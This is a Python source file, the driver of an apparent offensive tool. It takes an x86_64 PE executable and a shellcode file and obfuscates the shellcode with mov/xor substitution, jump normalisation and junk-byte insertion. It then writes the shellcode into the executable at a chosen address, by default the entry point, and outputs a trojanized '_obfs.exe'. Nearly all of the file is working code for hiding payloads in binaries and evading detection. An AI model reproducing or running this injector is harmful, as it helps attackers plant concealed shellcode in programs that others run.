from obfuscate import *
from mlog import *
from optparse import OptionParser

def main():
    print_banner()
    logging.log(WARNING, "THIS SCRIPT HAS TO RUN WITH PYTHON>V3 & CAPSTONE>V1")
    logging.log(WARNING, "THIS SCRIPT ONLY SUPPORTS BINRARIES WITH X86_64 ARCH")

    parser = OptionParser()

    parser.add_option("-f", "--pe-file", dest="pe_file", help="Pe file to operate on [REQUIRED]", metavar="PE_FILE")
    parser.add_option("-s", "--shellcode-file", dest="shellcode_file", help="Shellcode file to operate on [REQUIRED]")
    parser.add_option("-i", "--iteration", dest="obfs_iterations", help="Number of iterations to obfuscate the file")
    parser.add_option("-a", "--rva", dest="rva", help="Relative Virtual Address in target PE file")

    (options, args) = parser.parse_args()

    if (options.pe_file is None)\
            or (options.shellcode_file is None):
        print(parser.print_help())
        sys.exit(0)

    infile = options.pe_file
    outfile = infile + "_obfs.exe"
    shellcode_file = options.shellcode_file

    try:
        options.obfs_iterations = int(options.obfs_iterations, 10)
        if options.obfs_iterations == 0:
            logging.log(WARNING, "0 iterations specified for obfuscation defaulting to 20")
            options.obfs_iterations = 20
    except:
        logging.log(ERROR, "Invalid number of iterations specified Exiting...")
        sys.exit(0)


    # Init random seed
    # random.seed(a=None, version=2)


    logging.log(INFO, "Loading PE file from {0}".format(infile))
    mpe = MPE(infile)
    logging.log(SUCCESS, "Loaded PE file with size of {0} bytes".format(len(mpe.pe_bytes)))

    mpe.load_shellcode(shellcode_file)
    logging.log(SUCCESS, "Loaded shellcode with size of {0} bytes".format(len(mpe.shellcode_bytes)))

    pasm = ASM_UTILS()
    obfs = OBFS(options.obfs_iterations, mpe, pasm, 0)

    try:
        options.rva = int(options.rva, 16)
        if options.rva == 0:
            logging.log(WARNING, "RVA of 0 specified. Defaulting to Entry Point")
            options.rva = obfs.mpe.get_address_of_entry_point()
    except:
        logging.log(ERROR, "Invalid RVA specified Exiting...")
        sys.exit(0)

    obfs.set_target_rva(options.rva)
    logging.log(INFO, "Target RVA is set to {0}".format(hex(obfs.target_rva)))
    # logging.log(INFO, "Before Obfuscating")
    # obfs.pasm.print_disasm(obfs.mpe.shellcode_bytes)

    # logging.log(INFO, "After Obfuscation")
    # Find the immediate movs
    obfs.pasm.find_immediate_movs(obfs.mpe.shellcode_bytes)
    logging.log(SUCCESS, "Shellcode contains {0} mov instructions".format(len(obfs.pasm.mov_array)))
    # Find the relative branches
    obfs.pasm.find_relative_branches(obfs.mpe.shellcode_bytes)
    logging.log(SUCCESS, "Shellcode contains {0} relative branch instructions".format(len(obfs.pasm.jmp_array)))
    # Uniform the jmps
    logging.log(INFO, "Uniforming relative branch instructions")
    logging.log(WARNING, "Unsupported branch instructions: jecxz jcxz,loopcc")
    obfs.mpe.shellcode_bytes = obfs.uniform_jmps(obfs.mpe.shellcode_bytes)
    # Obfuscate the movs with mov, xor combination
    logging.log(INFO, "Obfuscating mov instructions")
    obfs.obfuscate_movs()
    # Update the mov array on the shellcode bytearray
    logging.log(INFO, "Updating the shellcode bytearray with modified instructions")
    for i in range(0, len(obfs.pasm.mov_array)):
        obfs.mpe.shellcode_bytes = insert_bytes(obfs.mpe.shellcode_bytes, obfs.pasm.mov_array[i].addr + obfs.pasm.mov_array[i].size, obfs.pasm.mov_array[i].postbytes)
        obfs.mpe.shellcode_bytes = obfs.fix_jmps(obfs.mpe.shellcode_bytes, obfs.pasm.mov_array[i].addr + obfs.pasm.mov_array[i].size, obfs.pasm.mov_array[i].postbytes)
        obfs.mpe.shellcode_bytes = obfs.fix_movs(obfs.mpe.shellcode_bytes)

    obfs.set_iterations(options.obfs_iterations)
    logging.log(INFO, "Obfuscating the shellcode bytearray with the repetition of {0}".format(obfs.iterations))
    # Insert the junk & fix the array
    shellcode_bytes = obfs.mix_junk_to_bytes()
    obfs.mpe.shellcode_bytes = shellcode_bytes
    logging.log(INFO, "Obfuscated shellcode size: {0} bytes".format(len(obfs.mpe.shellcode_bytes)))


    # obfs.pasm.print_disasm(obfs.mpe.shellcode_bytes)
    # Insert garbage infused shellcode into the specified vaddr
    logging.log(INFO, "Writing the result to the output file")
    obfs.mpe.write_to_addr(obfs.target_rva, mpe.shellcode_bytes)
    written = write_bytes(outfile, mpe.pe_bytes)
    if written:
        logging.log(SUCCESS, "Written {0} bytes to {1}".format(written, outfile))
    else:
        logging.log(ERROR, "Could not write to file {0}".format(outfile))


if __name__ == '__main__':
    main()
